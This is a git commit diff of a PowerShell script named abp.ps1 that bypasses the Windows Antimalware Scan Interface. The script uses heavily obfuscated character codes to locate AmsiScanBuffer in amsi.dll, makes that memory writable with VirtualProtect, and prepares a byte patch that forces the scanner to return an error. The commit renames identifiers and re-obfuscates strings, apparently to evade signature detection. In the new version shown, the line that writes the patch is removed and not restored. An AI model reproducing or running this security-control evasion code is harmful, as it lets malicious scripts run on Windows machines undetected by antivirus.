a60ad9035efccb87d03d9eb439192763ffa3364c
mattmillen15 <68832392+mattmillen15@users.noreply.github.com>
2023-03-17 12:27:41 -0400

    Update abp.ps1

--- abp.ps1
+++ abp.ps1
@@ -1,27 +1,26 @@
-$jurii = @"
+$mvzkx = @"
 using System;
 using System.Runtime.InteropServices;
-public class jurii {
+public class mvzkx {
     [DllImport("kernel32")]
     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
     [DllImport("kernel32")]
     public static extern IntPtr LoadLibrary(string name);
     [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr kphtsp, uint flNewProtect, out uint lpflOldProtect);
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr qxysni, uint flNewProtect, out uint lpflOldProtect);
 }
 "@
 
-Add-Type $jurii
+Add-Type $mvzkx
 
-$kmvetnc = [jurii]::LoadLibrary("$(('âmsì.'+'dll').nOrmAliZE([chAR](70*38/38)+[chAR](111*15/15)+[CHAr](101+13)+[cHaR]([ByTe]0x6d)+[ChAr](68*32/32)) -replace [chAR]([BYTE]0x5c)+[chAR]([BytE]0x70)+[chaR](123+17-17)+[chaR](77+64-64)+[ChAr](110)+[cHAr]([bYtE]0x7d))")
-$lqxiah = [jurii]::GetProcAddress($kmvetnc, "$([cHaR]([BytE]0x41)+[cHAr](109+83-83)+[char](115*103/103)+[chaR](105*81/81)+[char]([Byte]0x53)+[chAR](99+58-58)+[ChAr]([bYte]0x61)+[CHar]([bYTe]0x6e)+[cHAr]([BYTE]0x42)+[char]([BYte]0x75)+[ChaR](95+7)+[CHar]([BytE]0x66)+[CHAr]([ByTe]0x65)+[Char]([BYte]0x72))")
+$pgspoyx = [mvzkx]::LoadLibrary("$(('áms'+'í.d'+'ll').NorMaLIZE([CHaR]([byTE]0x46)+[ChAR]([bYTe]0x6f)+[cHAR](114*26/26)+[CHAr](109+62-62)+[cHaR](68)) -replace [ChAr]([BYTE]0x5c)+[ChAr](99+13)+[CHAr](123+33-33)+[cHAR]([BytE]0x4d)+[CHaR](110*65/65)+[ChAr]([Byte]0x7d))")
+$ebqbyt = [mvzkx]::GetProcAddress($pgspoyx, "$([ChAr]([ByTe]0x41)+[chAr]([BYTe]0x6d)+[chAr](37+78)+[Char]([bYtE]0x69)+[CHAr]([BytE]0x53)+[CHAR](99*97/97)+[CHar](97+40-40)+[ChAR]([ByTE]0x6e)+[chAR](66+34-34)+[cHar](117)+[chAR](102*11/11)+[cHaR](102)+[cHaR]([bytE]0x65)+[CHaR]([BYTE]0x72))")
 $p = 0
-$axwv = "0xC3"
-$gsgh = "0x57"
-[jurii]::VirtualProtect($lqxiah, [uint32]5, 0x40, [ref]$p)
-$umpa = "0x07"
-$qplr = "0xB8"
-$rtxk = "0x80"
-$qpah = "0x00"
-$vrivv = [Byte[]] ($qplr,$gsgh,$qpah,$umpa,+$rtxk,+$axwv)
-[System.Runtime.InteropServices.Marshal]::Copy($vrivv, 0, $lqxiah, 6)
+$vswd = "0xB8"
+$kbnf = "0x57"
+$hkgq = "0x00"
+$gnie = "0x07"
+$vuun = "0x80"
+$qsnk = "0xC3"
+[mvzkx]::VirtualProtect($ebqbyt, [uint32]5, 0x40, [ref]$p)
+$oylua = [Byte[]] ($vswd,$kbnf,$hkgq,$gnie,+$vuun,+$qsnk)
